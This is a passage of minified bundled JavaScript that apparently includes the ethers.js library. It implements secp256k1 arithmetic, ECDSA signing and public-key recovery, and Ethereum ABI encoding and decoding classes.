                            if ("object" !== typeof l || "bigint" !== typeof l.r || "bigint" !== typeof l.s)
                                throw new Error("PARSE");
                            {
                                const {r: e, s: t} = l;
                                h = new g(e,t)
                            }
                        }
                        f = c.fromHex(n)
                    } catch (C) {
                        if ("PARSE" === C.message)
                            throw new Error("signature must be Signature instance, Uint8Array or hex string");
                        return !1
                    }
                    if (u && h.hasHighS())
                        return !1;
                    d && (r = t.hash(r));
                    const {r: p, s: y} = h
                      , m = v(r)
                      , b = a(y)
                      , w = s(m * b)
                      , T = s(p * b)
                      , A = null === (o = c.BASE.multiplyAndAddUnsafe(f, w, T)) || void 0 === o ? void 0 : o.toAffine();
                    return !!A && s(A.x) === p
                },
                ProjectivePoint: c,
                Signature: g,
                utils: y
            }
        }
        function xO(e) {
            return {
                hash: e,
                hmac: function(t) {
                    for (var r = arguments.length, n = new Array(r > 1 ? r - 1 : 0), o = 1; o < r; o++)
                        n[o - 1] = arguments[o];
                    return qI(e, t, function() {
                        for (var e = arguments.length, t = new Array(e), r = 0; r < e; r++)
                            t[r] = arguments[r];
                        const n = new Uint8Array(t.reduce(( (e, t) => e + t.length), 0));
                        let o = 0;
                        return t.forEach((e => {
                            if (!WI(e))
                                throw new Error("Uint8Array expected");
                            n.set(e, o),
                            o += e.length
                        }
                        )),
                        n
                    }(...n))
                },
                randomBytes: VI
            }
        }
        const OO = BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f")
          , _O = BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141")
          , WO = BigInt(1)
          , RO = BigInt(2)
          , kO = (e, t) => (e + t / RO) / t;
        function MO(e) {
            const t = OO
              , r = BigInt(3)
              , n = BigInt(6)
              , o = BigInt(11)
              , i = BigInt(22)
              , s = BigInt(23)
              , a = BigInt(44)
              , c = BigInt(88)
              , l = e * e * e % t
              , u = l * l * e % t
              , d = dO(u, r, t) * u % t
              , h = dO(d, r, t) * u % t
              , f = dO(h, RO, t) * l % t
              , p = dO(f, o, t) * f % t
              , g = dO(p, i, t) * p % t
              , y = dO(g, a, t) * g % t
              , m = dO(y, c, t) * y % t
              , b = dO(m, a, t) * g % t
              , v = dO(b, r, t) * u % t
              , w = dO(v, s, t) * p % t
              , T = dO(w, n, t) * l % t
              , A = dO(T, RO, t);
            if (!NO.eql(NO.sqr(A), e))
                throw new Error("Cannot find square root");
            return A
        }
        const NO = function(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] && arguments[2]
              , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
            if (e <= rO)
                throw new Error("Expected Field ORDER > 0, got ".concat(e));
            const {nBitLength: o, nByteLength: i} = gO(e, t);
            if (i > 2048)
                throw new Error("Field lengths over 2048 bytes are not supported");
            const s = fO(e)
              , a = Object.freeze({
                ORDER: e,
                BITS: o,
                BYTES: i,
                MASK: Yx(o),
                ZERO: rO,
                ONE: nO,
                create: t => lO(t, e),
                isValid: t => {
                    if ("bigint" !== typeof t)
                        throw new Error("Invalid field element: expected bigint, got ".concat(typeof t));
                    return rO <= t && t < e
                }
                ,
                is0: e => e === rO,
                isOdd: e => (e & nO) === nO,
                neg: t => lO(-t, e),
                eql: (e, t) => e === t,
                sqr: t => lO(t * t, e),
                add: (t, r) => lO(t + r, e),
                sub: (t, r) => lO(t - r, e),
                mul: (t, r) => lO(t * r, e),
                pow: (e, t) => function(e, t, r) {
                    if (r < rO)
                        throw new Error("Expected power > 0");
                    if (r === rO)
                        return e.ONE;
                    if (r === nO)
                        return t;
                    let n = e.ONE
                      , o = t;
                    for (; r > rO; )
                        r & nO && (n = e.mul(n, o)),
                        o = e.sqr(o),
                        r >>= nO;
                    return n
                }(a, e, t),
                div: (t, r) => lO(t * hO(r, e), e),
                sqrN: e => e * e,
                addN: (e, t) => e + t,
                subN: (e, t) => e - t,
                mulN: (e, t) => e * t,
                inv: t => hO(t, e),
                sqrt: n.sqrt || (e => s(a, e)),
                invertBatch: e => function(e, t) {
                    const r = new Array(t.length)
                      , n = t.reduce(( (t, n, o) => e.is0(n) ? t : (r[o] = t,
                    e.mul(t, n))), e.ONE)
                      , o = e.inv(n);
                    return t.reduceRight(( (t, n, o) => e.is0(n) ? t : (r[o] = e.mul(t, r[o]),
                    e.mul(t, n))), o),
                    r
                }(a, e),
                cmov: (e, t, r) => r ? t : e,
                toBytes: e => r ? $x(e, i) : Gx(e, i),
                fromBytes: e => {
                    if (e.length !== i)
                        throw new Error("Fp.fromBytes: expected ".concat(i, ", got ").concat(e.length));
                    return r ? qx(e) : Hx(e)
                }
            });
            return Object.freeze(a)
        }(OO, void 0, void 0, {
            sqrt: MO
        })
          , FO = function(e, t) {
            const r = t => BO((0,
            k.A)((0,
            k.A)({}, e), xO(t)));
            return Object.freeze((0,
            k.A)((0,
            k.A)({}, r(t)), {}, {
                create: r
            }))
        }({
            a: BigInt(0),
            b: BigInt(7),
            Fp: NO,
            n: _O,
            Gx: BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),
            Gy: BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),
            h: BigInt(1),
            lowS: !0,
            endo: {
                beta: BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),
                splitScalar: e => {
                    const t = _O
                      , r = BigInt("0x3086d221a7d46bcde86c90e49284eb15")
                      , n = -WO * BigInt("0xe4437ed6010e88286f547fa90abfe4c3")
                      , o = BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8")
                      , i = r
                      , s = BigInt("0x100000000000000000000000000000000")
                      , a = kO(i * e, t)
                      , c = kO(-n * e, t);
                    let l = lO(e - a * r - c * o, t)
                      , u = lO(-a * n - c * i, t);
                    const d = l > s
                      , h = u > s;
                    if (d && (l = t - l),
                    h && (u = t - u),
                    l > s || u > s)
                        throw new Error("splitScalar: Endomorphism failed, k=" + e);
                    return {
                        k1neg: d,
                        k1: l,
                        k2neg: h,
                        k2: u
                    }
                }
            }
        }, rB);
        BigInt(0);
        FO.ProjectivePoint;
        var UO = new WeakMap;
        class DO {
            constructor(e) {
                ES(this, UO, void 0),
                NS(32 === ZS(e), "invalid private key", "privateKey", "[REDACTED]"),
                CS(UO, this, $S(e))
            }
            get privateKey() {
                return SS(UO, this)
            }
            get publicKey() {
                return DO.computePublicKey(SS(UO, this))
            }
            get compressedPublicKey() {
                return DO.computePublicKey(SS(UO, this), !0)
            }
            sign(e) {
                NS(32 === ZS(e), "invalid digest length", "digest", e);
                const t = FO.sign(VS(e), VS(SS(UO, this)), {
                    lowS: !0
                });
                return PI.from({
                    r: lI(t.r, 32),
                    s: lI(t.s, 32),
                    v: t.recovery ? 28 : 27
                })
            }
            computeSharedSecret(e) {
                const t = DO.computePublicKey(e);
                return $S(FO.getSharedSecret(VS(SS(UO, this)), zS(t), !1))
            }
            static computePublicKey(e, t) {
                let r = zS(e, "key");
                if (32 === r.length) {
                    return $S(FO.getPublicKey(r, !!t))
                }
                if (64 === r.length) {
                    const e = new Uint8Array(65);
                    e[0] = 4,
                    e.set(r, 1),
                    r = e
                }
                return $S(FO.ProjectivePoint.fromHex(r).toRawBytes(t))
            }
            static recoverPublicKey(e, t) {
                NS(32 === ZS(e), "invalid digest length", "digest", e);
                const r = PI.from(t);
                let n = FO.Signature.fromCompact(VS(KS([r.r, r.s])));
                n = n.addRecoveryBit(r.yParity);
                const o = n.recoverPublicKey(VS(e));
                return NS(null != o, "invalid signautre for digest", "signature", t),
                "0x" + o.toHex(!1)
            }
            static addPoints(e, t, r) {
                const n = FO.ProjectivePoint.fromHex(DO.computePublicKey(e).substring(2))
                  , o = FO.ProjectivePoint.fromHex(DO.computePublicKey(t).substring(2));
                return "0x" + n.add(o).toHex(!!r)
            }
        }
        function LO(e) {
            let t;
            return t = "string" === typeof e ? DO.computePublicKey(e, !1) : e.publicKey,
            Nx(ix("0x" + t.substring(4)).substring(26))
        }
        function jO(e, t) {
            return LO(DO.recoverPublicKey(e, t))
        }
        const zO = 32
          , VO = new Uint8Array(zO)
          , HO = ["then"]
          , qO = {}
          , GO = new WeakMap;
        function $O(e) {
            return GO.get(e)
        }
        function KO(e, t) {
            GO.set(e, t)
        }
        function ZO(e, t) {
            const r = new Error("deferred error during ABI decoding triggered accessing ".concat(e));
            throw r.error = t,
            r
        }
        function YO(e, t, r) {
            return e.indexOf(null) >= 0 ? t.map(( (e, t) => e instanceof XO ? YO($O(e), e, r) : e)) : e.reduce(( (e, n, o) => {
                let i = t.getValue(n);
                return n in e || (r && i instanceof XO && (i = YO($O(i), i, r)),
                e[n] = i),
                e
            }
            ), {})
        }
        var JO = new WeakMap;
        class XO extends Array {
            constructor() {
                for (var e = arguments.length, t = new Array(e), r = 0; r < e; r++)
                    t[r] = arguments[r];
                const n = t[0];
                let o = t[1]
                  , i = (t[2] || []).slice()
                  , s = !0;
                n !== qO && (o = t,
                i = [],
                s = !1),
                super(o.length),
                ES(this, JO, void 0),
                o.forEach(( (e, t) => {
                    this[t] = e
                }
                ));
                const a = i.reduce(( (e, t) => ("string" === typeof t && e.set(t, (e.get(t) || 0) + 1),
                e)), new Map);
                if (KO(this, Object.freeze(o.map(( (e, t) => {
                    const r = i[t];
                    return null != r && 1 === a.get(r) ? r : null
                }
                )))),
                CS(JO, this, []),
                null == SS(JO, this) && SS(JO, this),
                !s)
                    return;
                Object.freeze(this);
                const c = new Proxy(this,{
                    get: (e, t, r) => {
                        if ("string" === typeof t) {
                            if (t.match(/^[0-9]+$/)) {
                                const r = cI(t, "%index");
                                if (r < 0 || r >= this.length)
                                    throw new RangeError("out of result range");
                                const n = e[r];
                                return n instanceof Error && ZO("index ".concat(r), n),
                                n
                            }
                            if (HO.indexOf(t) >= 0)
                                return Reflect.get(e, t, r);
                            const n = e[t];
                            if (n instanceof Function)
                                return function() {
                                    for (var t = arguments.length, o = new Array(t), i = 0; i < t; i++)
                                        o[i] = arguments[i];
                                    return n.apply(this === r ? e : this, o)
                                }
                                ;
                            if (!(t in e))
                                return e.getValue.apply(this === r ? e : this, [t])
                        }
                        return Reflect.get(e, t, r)
                    }
                });
                return KO(c, $O(this)),
                c
            }
            toArray(e) {
                const t = [];
                return this.forEach(( (r, n) => {
                    r instanceof Error && ZO("index ".concat(n), r),
                    e && r instanceof XO && (r = r.toArray(e)),
                    t.push(r)
                }
                )),
                t
            }
            toObject(e) {
                const t = $O(this);
                return t.reduce(( (r, n, o) => (MS(null != n, "value at index ".concat(o, " unnamed"), "UNSUPPORTED_OPERATION", {
                    operation: "toObject()"
                }),
                YO(t, this, e))), {})
            }
            slice(e, t) {
                null == e && (e = 0),
                e < 0 && (e += this.length) < 0 && (e = 0),
                null == t && (t = this.length),
                t < 0 && (t += this.length) < 0 && (t = 0),
                t > this.length && (t = this.length);
                const r = $O(this)
                  , n = []
                  , o = [];
                for (let i = e; i < t; i++)
                    n.push(this[i]),
                    o.push(r[i]);
                return new XO(qO,n,o)
            }
            filter(e, t) {
                const r = $O(this)
                  , n = []
                  , o = [];
                for (let i = 0; i < this.length; i++) {
                    const s = this[i];
                    s instanceof Error && ZO("index ".concat(i), s),
                    e.call(t, s, i, this) && (n.push(s),
                    o.push(r[i]))
                }
                return new XO(qO,n,o)
            }
            map(e, t) {
                const r = [];
                for (let n = 0; n < this.length; n++) {
                    const o = this[n];
                    o instanceof Error && ZO("index ".concat(n), o),
                    r.push(e.call(t, o, n, this))
                }
                return r
            }
            getValue(e) {
                const t = $O(this).indexOf(e);
                if (-1 === t)
                    return;
                const r = this[t];
                return r instanceof Error && ZO("property ".concat(JSON.stringify(e)), r.error),
                r
            }
            static fromItems(e, t) {
                return new XO(qO,e,t)
            }
        }
        function QO(e) {
            let t = uI(e);
            return MS(t.length <= zO, "value out-of-bounds", "BUFFER_OVERRUN", {
                buffer: t,
                length: zO,
                offset: t.length
            }),
            t.length !== zO && (t = VS(KS([VO.slice(t.length % zO), t]))),
            t
        }
        class e_ {
            constructor(e, t, r, n) {
                (0,
                CI.A)(this, "name", void 0),
                (0,
                CI.A)(this, "type", void 0),
                (0,
                CI.A)(this, "localName", void 0),
                (0,
                CI.A)(this, "dynamic", void 0),
                _S(this, {
                    name: e,
                    type: t,
                    localName: r,
                    dynamic: n
                }, {
                    name: "string",
                    type: "string",
                    localName: "string",
                    dynamic: "boolean"
                })
            }
            _throwError(e, t) {
                NS(!1, e, this.localName, t)
            }
        }
        var t_ = new WeakMap
          , r_ = new WeakMap
          , n_ = new WeakSet;
        class o_ {
            constructor() {
                DB(this, n_),
                ES(this, t_, void 0),
                ES(this, r_, void 0),
                CS(t_, this, []),
                CS(r_, this, 0)
            }
            get data() {
                return KS(SS(t_, this))
            }
            get length() {
                return SS(r_, this)
            }
            appendWriter(e) {
                return PS(n_, this, i_).call(this, VS(e.data))
            }
            writeBytes(e) {
                let t = VS(e);
                const r = t.length % zO;
                return r && (t = VS(KS([t, VO.slice(r)]))),
                PS(n_, this, i_).call(this, t)
            }
            writeValue(e) {
                return PS(n_, this, i_).call(this, QO(e))
            }
            writeUpdatableValue() {
                const e = SS(t_, this).length;
                return SS(t_, this).push(VO),
                CS(r_, this, SS(r_, this) + zO),
                t => {
                    SS(t_, this)[e] = QO(t)
                }
            }
        }
        function i_(e) {
            return SS(t_, this).push(e),
            CS(r_, this, SS(r_, this) + e.length),
            e.length
        }
        var s_ = new WeakMap
          , a_ = new WeakMap
          , c_ = new WeakMap
          , l_ = new WeakMap
          , u_ = new WeakMap
          , d_ = new WeakSet;
        class h_ {
            constructor(e, t, r) {
                DB(this, d_),
                (0,
                CI.A)(this, "allowLoose", void 0),
                ES(this, s_, void 0),
                ES(this, a_, void 0),
                ES(this, c_, void 0),
                ES(this, l_, void 0),
                ES(this, u_, void 0),
                _S(this, {
                    allowLoose: !!t
                }),
                CS(s_, this, VS(e)),
                CS(c_, this, 0),
                CS(l_, this, null),
                CS(u_, this, null != r ? r : 1024),
                CS(a_, this, 0)
            }
            get data() {
                return $S(SS(s_, this))
            }
            get dataLength() {
                return SS(s_, this).length
            }
            get consumed() {
                return SS(a_, this)
            }
            get bytes() {
                return new Uint8Array(SS(s_, this))
            }
            subReader(e) {
                const t = new h_(SS(s_, this).slice(SS(a_, this) + e),this.allowLoose,SS(u_, this));
                return CS(l_, t, this),
                t
            }
            readBytes(e, t) {
                let r = PS(d_, this, p_).call(this, 0, e, !!t);
                return PS(d_, this, f_).call(this, e),
                CS(a_, this, SS(a_, this) + r.length),
                r.slice(0, e)
            }
            readValue() {
                return aI(this.readBytes(zO))
            }
            readIndex() {
                return cI(aI(this.readBytes(zO)))
            }
        }
        function f_(e) {
            var t;
            if (SS(l_, this))
                return PS(d_, t = SS(l_, this), f_).call(t, e);
            CS(c_, this, SS(c_, this) + e),
            MS(SS(u_, this) < 1 || SS(c_, this) <= SS(u_, this) * this.dataLength, "compressed ABI data exceeds inflation ratio of ".concat(SS(u_, this), " ( see: https://github.com/ethers-io/ethers.js/issues/4537 )"), "BUFFER_OVERRUN", {
                buffer: VS(SS(s_, this)),
                offset: SS(a_, this),
                length: e,
                info: {
                    bytesRead: SS(c_, this),
                    dataLength: this.dataLength
                }
            })
        }
        function p_(e, t, r) {
            let n = Math.ceil(t / zO) * zO;
            return SS(a_, this) + n > SS(s_, this).length && (this.allowLoose && r && SS(a_, this) + t <= SS(s_, this).length ? n = t : MS(!1, "data out-of-bounds", "BUFFER_OVERRUN", {
                buffer: VS(SS(s_, this)),
                length: SS(s_, this).length,
                offset: SS(a_, this) + n
            })),
            SS(s_, this).slice(SS(a_, this), SS(a_, this) + n)
        }
        const g_ = {};
        function y_(e, t) {
            let r = !1;
            return t < 0 && (r = !0,
            t *= -1),
            new w_(g_,"".concat(r ? "" : "u", "int").concat(t),e,{
                signed: r,
                width: t
            })
        }
        function m_(e, t) {
            return new w_(g_,"bytes".concat(t || ""),e,{
                size: t
            })
        }
        const b_ = Symbol.for("_ethers_typed");
        var v_ = new WeakMap;
        class w_ {
            constructor(e, t, r, n) {
                (0,
                CI.A)(this, "type", void 0),
                (0,
                CI.A)(this, "value", void 0),
                ES(this, v_, void 0),
                (0,
                CI.A)(this, "_typedSymbol", void 0),
                null == n && (n = null),
                LS(g_, e, "Typed"),
                _S(this, {
                    _typedSymbol: b_,
                    type: t,
                    value: r
                }),
                CS(v_, this, n),
                this.format()
            }
            format() {
                if ("array" === this.type)
                    throw new Error("");
                if ("dynamicArray" === this.type)
                    throw new Error("");
                return "tuple" === this.type ? "tuple(".concat(this.value.map((e => e.format())).join(","), ")") : this.type
            }
            defaultValue() {
                return 0
            }
            minValue() {
                return 0
            }
            maxValue() {
                return 0
            }
            isBigInt() {
                return !!this.type.match(/^u?int[0-9]+$/)
            }
            isData() {
                return this.type.startsWith("bytes")
            }
            isString() {
                return "string" === this.type
            }
            get tupleName() {
                if ("tuple" !== this.type)
                    throw TypeError("not a tuple");
                return SS(v_, this)
            }
            get arrayLength() {
                if ("array" !== this.type)
                    throw TypeError("not an array");
                return !0 === SS(v_, this) ? -1 : !1 === SS(v_, this) ? this.value.length : null
            }
            static from(e, t) {
                return new w_(g_,e,t)
            }
            static uint8(e) {
                return y_(e, 8)
            }
            static uint16(e) {
                return y_(e, 16)
            }
            static uint24(e) {
                return y_(e, 24)
            }
            static uint32(e) {
                return y_(e, 32)
            }
            static uint40(e) {
                return y_(e, 40)
            }
            static uint48(e) {
                return y_(e, 48)
            }
            static uint56(e) {
                return y_(e, 56)
            }
            static uint64(e) {
                return y_(e, 64)
            }
            static uint72(e) {
                return y_(e, 72)
            }
            static uint80(e) {
                return y_(e, 80)
            }
            static uint88(e) {
                return y_(e, 88)
            }
            static uint96(e) {
                return y_(e, 96)
            }
            static uint104(e) {
                return y_(e, 104)
            }
            static uint112(e) {
                return y_(e, 112)
            }
            static uint120(e) {
                return y_(e, 120)
            }
            static uint128(e) {
                return y_(e, 128)
            }
            static uint136(e) {
                return y_(e, 136)
            }
            static uint144(e) {
                return y_(e, 144)
            }
            static uint152(e) {
                return y_(e, 152)
            }
            static uint160(e) {
                return y_(e, 160)
            }
            static uint168(e) {
                return y_(e, 168)
            }
            static uint176(e) {
                return y_(e, 176)
            }
            static uint184(e) {
                return y_(e, 184)
            }
            static uint192(e) {
                return y_(e, 192)
            }
            static uint200(e) {
                return y_(e, 200)
            }
            static uint208(e) {
                return y_(e, 208)
            }
            static uint216(e) {
                return y_(e, 216)
            }
            static uint224(e) {
                return y_(e, 224)
            }
            static uint232(e) {
                return y_(e, 232)
            }
            static uint240(e) {
                return y_(e, 240)
            }
            static uint248(e) {
                return y_(e, 248)
            }
            static uint256(e) {
                return y_(e, 256)
            }
            static uint(e) {
                return y_(e, 256)
            }
            static int8(e) {
                return y_(e, -8)
            }
            static int16(e) {
                return y_(e, -16)
            }
            static int24(e) {
                return y_(e, -24)
            }
            static int32(e) {
                return y_(e, -32)
            }
            static int40(e) {
                return y_(e, -40)
            }
            static int48(e) {
                return y_(e, -48)
            }
            static int56(e) {
                return y_(e, -56)
            }
            static int64(e) {
                return y_(e, -64)
            }
            static int72(e) {
                return y_(e, -72)
            }
            static int80(e) {
                return y_(e, -80)
            }
            static int88(e) {
                return y_(e, -88)
            }
            static int96(e) {
                return y_(e, -96)
            }
            static int104(e) {
                return y_(e, -104)
            }
            static int112(e) {
                return y_(e, -112)
            }
            static int120(e) {
                return y_(e, -120)
            }
            static int128(e) {
                return y_(e, -128)
            }
            static int136(e) {
                return y_(e, -136)
            }
            static int144(e) {
                return y_(e, -144)
            }
            static int152(e) {
                return y_(e, -152)
            }
            static int160(e) {
                return y_(e, -160)
            }
            static int168(e) {
                return y_(e, -168)
            }
            static int176(e) {
                return y_(e, -176)
            }
            static int184(e) {
                return y_(e, -184)
            }
            static int192(e) {
                return y_(e, -192)
            }
            static int200(e) {
                return y_(e, -200)
            }
            static int208(e) {
                return y_(e, -208)
            }
            static int216(e) {
                return y_(e, -216)
            }
            static int224(e) {
                return y_(e, -224)
            }
            static int232(e) {
                return y_(e, -232)
            }
            static int240(e) {
                return y_(e, -240)
            }
            static int248(e) {
                return y_(e, -248)
            }
            static int256(e) {
                return y_(e, -256)
            }
            static int(e) {
                return y_(e, -256)
            }
            static bytes1(e) {
                return m_(e, 1)
            }
            static bytes2(e) {
                return m_(e, 2)
            }
            static bytes3(e) {
                return m_(e, 3)
            }
            static bytes4(e) {
                return m_(e, 4)
            }
            static bytes5(e) {
                return m_(e, 5)
            }
            static bytes6(e) {
                return m_(e, 6)
            }
            static bytes7(e) {
                return m_(e, 7)
            }
            static bytes8(e) {
                return m_(e, 8)
            }
            static bytes9(e) {
                return m_(e, 9)
            }
            static bytes10(e) {
                return m_(e, 10)
            }
            static bytes11(e) {
                return m_(e, 11)
            }
            static bytes12(e) {
                return m_(e, 12)
            }
            static bytes13(e) {
                return m_(e, 13)
            }
            static bytes14(e) {
                return m_(e, 14)
            }
            static bytes15(e) {
                return m_(e, 15)
            }
            static bytes16(e) {
                return m_(e, 16)
            }
            static bytes17(e) {
                return m_(e, 17)
            }
            static bytes18(e) {
                return m_(e, 18)
            }
            static bytes19(e) {
                return m_(e, 19)
            }
            static bytes20(e) {
                return m_(e, 20)
            }
            static bytes21(e) {
                return m_(e, 21)
            }
            static bytes22(e) {
                return m_(e, 22)
            }
            static bytes23(e) {
                return m_(e, 23)
            }
            static bytes24(e) {
                return m_(e, 24)
            }
            static bytes25(e) {
                return m_(e, 25)
            }
            static bytes26(e) {
                return m_(e, 26)
            }
            static bytes27(e) {
                return m_(e, 27)
            }
            static bytes28(e) {
                return m_(e, 28)
            }
            static bytes29(e) {
                return m_(e, 29)
            }
            static bytes30(e) {
                return m_(e, 30)
            }
            static bytes31(e) {
                return m_(e, 31)
            }
            static bytes32(e) {
                return m_(e, 32)
            }
            static address(e) {
                return new w_(g_,"address",e)
            }
            static bool(e) {
                return new w_(g_,"bool",!!e)
            }
            static bytes(e) {
                return new w_(g_,"bytes",e)
            }
            static string(e) {
                return new w_(g_,"string",e)
            }
            static array(e, t) {
                throw new Error("not implemented yet")
            }
            static tuple(e, t) {
                throw new Error("not implemented yet")
            }
            static overrides(e) {
                return new w_(g_,"overrides",Object.assign({}, e))
            }
            static isTyped(e) {
                return e && "object" === typeof e && "_typedSymbol"in e && e._typedSymbol === b_
            }
            static dereference(e, t) {
                if (w_.isTyped(e)) {
                    if (e.type !== t)
                        throw new Error("invalid type: expecetd ".concat(t, ", got ").concat(e.type));
                    return e.value
                }
                return e
            }
        }
        class T_ extends e_ {
            constructor(e) {
                super("address", "address", e, !1)
            }
            defaultValue() {
                return "0x0000000000000000000000000000000000000000"
            }
            encode(e, t) {
                let r = w_.dereference(t, "string");
                try {
                    r = Nx(r)
                } catch (n) {
                    return this._throwError(n.message, t)
                }
                return e.writeValue(r)
            }
            decode(e) {
                return Nx(lI(e.readValue(), 20))
            }
        }
        class A_ extends e_ {
            constructor(e) {
                super(e.name, e.type, "_", e.dynamic),
                (0,
                CI.A)(this, "coder", void 0),
                this.coder = e
            }
            defaultValue() {
                return this.coder.defaultValue()
            }
            encode(e, t) {
                return this.coder.encode(e, t)
            }
            decode(e) {
                return this.coder.decode(e)
            }
        }
        function E_(e, t, r) {
            let n = [];
            if (Array.isArray(r))
                n = r;
            else if (r && "object" === typeof r) {
                let e = {};
                n = t.map((t => {
                    const n = t.localName;
                    return MS(n, "cannot encode object for signature with missing names", "INVALID_ARGUMENT", {
                        argument: "values",
                        info: {
                            coder: t
                        },
                        value: r
                    }),
                    MS(!e[n], "cannot encode object for signature with duplicate names", "INVALID_ARGUMENT", {
                        argument: "values",
                        info: {
                            coder: t
                        },
                        value: r
                    }),
                    e[n] = !0,
                    r[n]
                }
                ))
            } else
                NS(!1, "invalid tuple value", "tuple", r);
            NS(t.length === n.length, "types/value length mismatch", "tuple", r);
            let o = new o_
              , i = new o_
              , s = [];
            t.forEach(( (e, t) => {
                let r = n[t];
                if (e.dynamic) {
                    let t = i.length;
                    e.encode(i, r);
                    let n = o.writeUpdatableValue();
                    s.push((e => {
                        n(e + t)
                    }
                    ))
                } else
                    e.encode(o, r)
            }
            )),
            s.forEach((e => {
                e(o.length)
            }
            ));
            let a = e.appendWriter(o);
            return a += e.appendWriter(i),
            a
        }
        function P_(e, t) {
            let r = []
              , n = []
              , o = e.subReader(0);
            return t.forEach((t => {
                let i = null;
                if (t.dynamic) {
                    let r = e.readIndex()
                      , n = o.subReader(r);
                    try {
                        i = t.decode(n)
                    } catch (s) {
                        if (RS(s, "BUFFER_OVERRUN"))
                            throw s;
                        i = s,
                        i.baseType = t.name,
                        i.name = t.localName,
                        i.type = t.type
                    }
                } else
                    try {
                        i = t.decode(e)
                    } catch (s) {
                        if (RS(s, "BUFFER_OVERRUN"))
                            throw s;
                        i = s,
                        i.baseType = t.name,
                        i.name = t.localName,
                        i.type = t.type
                    }
                if (void 0 == i)
                    throw new Error("investigate");
                r.push(i),
                n.push(t.localName || null)
            }
            )),
            XO.fromItems(r, n)
        }
        class C_ extends e_ {
            constructor(e, t, r) {
                super("array", e.type + "[" + (t >= 0 ? t : "") + "]", r, -1 === t || e.dynamic),
                (0,
                CI.A)(this, "coder", void 0),
                (0,
                CI.A)(this, "length", void 0),
                _S(this, {
                    coder: e,
                    length: t
                })
            }
            defaultValue() {
                const e = this.coder.defaultValue()
                  , t = [];
                for (let r = 0; r < this.length; r++)
                    t.push(e);
                return t
            }
            encode(e, t) {
                const r = w_.dereference(t, "array");
                Array.isArray(r) || this._throwError("expected array value", r);
                let n = this.length;
                -1 === n && (n = r.length,
                e.writeValue(r.length)),
                FS(r.length, n, "coder array" + (this.localName ? " " + this.localName : ""));
                let o = [];
                for (let i = 0; i < r.length; i++)
                    o.push(this.coder);
                return E_(e, o, r)
            }
            decode(e) {
                let t = this.length;
                -1 === t && (t = e.readIndex(),
                MS(t * zO <= e.dataLength, "insufficient data length", "BUFFER_OVERRUN", {
                    buffer: e.bytes,
                    offset: t * zO,
                    length: e.dataLength
                }));
                let r = [];
                for (let n = 0; n < t; n++)
                    r.push(new A_(this.coder));
                return P_(e, r)
            }
        }
        class S_ extends e_ {
            constructor(e) {
                super("bool", "bool", e, !1)
            }
            defaultValue() {
                return !1
            }
            encode(e, t) {
                const r = w_.dereference(t, "bool");
                return e.writeValue(r ? 1 : 0)
            }
            decode(e) {
                return !!e.readValue()
            }
        }
        class I_ extends e_ {
            constructor(e, t) {
                super(e, e, t, !0)
            }
            defaultValue() {
                return "0x"
            }
            encode(e, t) {
                t = VS(t);
                let r = e.writeValue(t.length);
                return r += e.writeBytes(t),
                r
            }
            decode(e) {
                return e.readBytes(e.readIndex(), !0)
            }
        }
        class B_ extends I_ {
            constructor(e) {
                super("bytes", e)
            }
            decode(e) {
                return $S(super.decode(e))
            }
        }
        class x_ extends e_ {
            constructor(e, t) {
                let r = "bytes" + String(e);
                super(r, r, t, !1),
                (0,
                CI.A)(this, "size", void 0),
                _S(this, {
                    size: e
                }, {
                    size: "number"
                })
            }
            defaultValue() {
                return "0x0000000000000000000000000000000000000000000000000000000000000000".substring(0, 2 + 2 * this.size)
            }
            encode(e, t) {
                let r = VS(w_.dereference(t, this.type));
                return r.length !== this.size && this._throwError("incorrect data length", t),
                e.writeBytes(r)
            }
            decode(e) {
                return $S(e.readBytes(this.size))
            }
        }
        const O_ = new Uint8Array([]);
        class __ extends e_ {
            constructor(e) {
                super("null", "", e, !1)
            }
            defaultValue() {
                return null
            }
            encode(e, t) {
                return null != t && this._throwError("not null", t),
                e.writeBytes(O_)
            }
            decode(e) {
                return e.readBytes(0),
                null
            }
        }
        const W_ = BigInt(0)
          , R_ = BigInt(1)
          , k_ = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
        class M_ extends e_ {
            constructor(e, t, r) {
                const n = (t ? "int" : "uint") + 8 * e;
                super(n, n, r, !1),
                (0,
                CI.A)(this, "size", void 0),
                (0,
                CI.A)(this, "signed", void 0),
                _S(this, {
                    size: e,
                    signed: t
                }, {
                    size: "number",
                    signed: "boolean"
                })
            }
            defaultValue() {
                return 0
            }
            encode(e, t) {
                let r = oI(w_.dereference(t, this.type))
                  , n = nI(k_, 256);
                if (this.signed) {
                    let e = nI(n, 8 * this.size - 1);
                    (r > e || r < -(e + R_)) && this._throwError("value out-of-bounds", t),
                    r = rI(r, 256)
                } else
                    (r < W_ || r > nI(n, 8 * this.size)) && this._throwError("value out-of-bounds", t);
                return e.writeValue(r)
            }
            decode(e) {
                let t = nI(e.readValue(), 8 * this.size);
                return this.signed && (t = function(e, t) {
                    const r = iI(e, "value")
                      , n = BigInt(cI(t, "width"));
                    if (MS(r >> n === QS, "overflow", "NUMERIC_FAULT", {
                        operation: "fromTwos",
                        fault: "overflow",
                        value: e
                    }),
                    r >> n - eI)
                        return -((~r & (eI << n) - eI) + eI);
                    return r
                }(t, 8 * this.size)),
                t
            }
        }
        class N_ extends I_ {
            constructor(e) {
                super("string", e)
            }
            defaultValue() {
                return ""
            }
            encode(e, t) {
                return super.encode(e, FB(w_.dereference(t, "string")))
            }
            decode(e) {
                return UB(super.decode(e))
            }
        }
        class F_ extends e_ {
            constructor(e, t) {
                let r = !1;
                const n = [];
                e.forEach((e => {
                    e.dynamic && (r = !0),
                    n.push(e.type)
                }
                ));
                super("tuple", "tuple(" + n.join(",") + ")", t, r),
                (0,
                CI.A)(this, "coders", void 0),
                _S(this, {
                    coders: Object.freeze(e.slice())
                })
            }
            defaultValue() {
                const e = [];
                this.coders.forEach((t => {
                    e.push(t.defaultValue())
                }
                ));
                const t = this.coders.reduce(( (e, t) => {
                    const r = t.localName;
                    return r && (e[r] || (e[r] = 0),
                    e[r]++),
                    e
